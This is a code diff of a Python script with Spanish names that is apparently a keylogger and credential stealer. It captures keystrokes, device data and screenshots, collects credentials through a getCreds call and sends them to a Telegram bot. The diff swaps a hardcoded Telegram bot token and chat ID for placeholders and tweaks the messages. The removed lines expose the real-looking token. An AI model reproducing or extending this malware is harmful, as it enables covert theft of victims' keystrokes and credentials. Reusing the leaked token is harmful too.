@@ -11,8 +11,8 @@ import credentials
 
 ####################################### CREDENCIALES Y GLOBALES
 
-TOKEN = "7705089492:AAFNPZ2jufblj91y4Q_XsB4KGKf_Q6sL_UE"
-CHAT_ID = "6814112276"
+TOKEN = "TOKEN"
+CHAT_ID = "CHAT_ID"
 
 intervalo_minutos = 10
 capturando = False
@@ -123,7 +123,8 @@ def capturar_teclas():
         enviar_telegram(f"Datos del dispositivo:{datos}\n",file_dst)
         enviar_captura()
         print("[INFO] FIN. TECLAS CAPTURADAS Y MENSAJE ENVIADO")
-        
+    else:
+        print("No se capturó nada, no hay mensaje hasta el siguiente ciclo")
     capturando = False
 
 def planificador():
@@ -143,9 +144,9 @@ def enviarCredenciales():
     credenciales = credentials.getCreds()
     print(credenciales)
     with open(file_dst,'w') as f:
-        f.write("Credenciales: \n" + credenciales)
+        f.write(f"Credenciales: \n{credenciales}",)
         f.close
-    enviar_telegram(f"Credenciales del dispositivo {quienSoy}\n",file_dst)
+    enviar_telegram(f"Credenciales del dispositivo \n{quienSoy}\n",file_dst)
 
 if __name__ == "__main__":     
     os.system("color 0A")
